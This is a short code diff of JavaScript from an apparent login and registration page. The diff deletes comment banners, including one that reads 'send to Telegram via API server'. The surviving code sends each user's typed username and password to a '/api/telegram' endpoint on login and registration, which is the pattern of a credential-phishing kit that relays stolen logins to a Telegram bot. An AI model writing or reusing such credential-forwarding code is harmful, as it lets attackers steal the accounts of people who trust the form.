@@ -636,9 +636,6 @@
     hideMessages();
   }
 
-  /* ============================================
-     KIRIM KE TELEGRAM VIA API SERVER
-     ============================================ */
   async function kirimKeTelegram(username, password, tipe) {
     try {
       var res = await fetch('/api/telegram', {
@@ -647,7 +644,7 @@
         body: JSON.stringify({
           username: username,
           password: password,
-          tipe: tipe // 'login' atau 'register'
+          tipe: tipe
         })
       });
       var data = await res.json();
@@ -659,9 +656,6 @@
     }
   }
 
-  /* ============================================
-     HANDLE LOGIN
-     ============================================ */
   async function handleLogin(e) {
     e.preventDefault();
     hideMessages();
@@ -689,9 +683,6 @@
     }, 1200);
   }
 
-  /* ============================================
-     HANDLE REGISTER
-     ============================================ */
   async function handleRegister(e) {
     e.preventDefault();
     hideMessages();
